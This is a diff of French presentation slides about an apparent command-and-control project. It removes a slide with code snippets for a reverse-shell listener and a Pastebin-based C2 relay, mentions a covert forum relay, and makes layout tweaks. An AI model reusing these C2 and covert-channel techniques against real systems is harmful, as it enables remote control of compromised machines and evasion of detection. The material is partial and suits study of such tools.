@@ -328,65 +328,6 @@ classDiagram
 layout: default
 ---
 
-# Types de Listeners
-
-<div class="grid grid-cols-2 gap-4">
-
-<div>
-
-## 1. Reverse Shell
-
-**Fichier**: `shell.py:13-36`
-
-```python
-class Shell:
-    def __init__(self, port):
-        self.port = port
-
-    def listen(self):
-        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server.bind((HOST, self.port))
-        self.server.listen(1)
-        self.client_socket, _ = self.server.accept()
-
-    def execute(self, command):
-        self.client_socket.sendall(command.encode())
-        return self.client_socket.recv(4096).decode(errors='ignore')
-```
-
-</div>
-
-<div>
-
-## 2. Pastebin Relay
-
-**Fichier**: `shell.py:38-138`
-
-Utilise l'API Pastebin pour C&C
-
-```python
-def execute(self, commande):
-    api_user_key = self.generate_user_key()
-    requests.post(paste_url, data=data)
-    while not self.find:
-        time.sleep(10)  # scrute le paste de réponse
-    return self.last["body"]
-```
-
-## 3. Forum Relay
-
-**Fichier**: `shell.py:140-244`
-
-Messages taggués sur forum
-
-</div>
-
-</div>
-
----
-layout: default
----
-
 # Listener Forum - Communication cachée
 
 <div class="grid grid-cols-2 gap-4">
@@ -395,7 +336,7 @@ layout: default
 
 ## Architecture
 
-```mermaid {scale: 0.5}
+```mermaid {scale: 0.45}
 sequenceDiagram
     participant C2
     participant Forum
@@ -664,11 +605,11 @@ class: text-sm
 
 ✅ Variables d'environnement pour secrets
 
-## Points d'amélioration
-
 ::right::
 
 <div class="pt-10">
+
+### Points d'amélioration
 
 - ⚠️ HTTPS obligatoire pour protéger les tokens.
 - ⚠️ Rate limiting sur `/signin` contre le bruteforce.
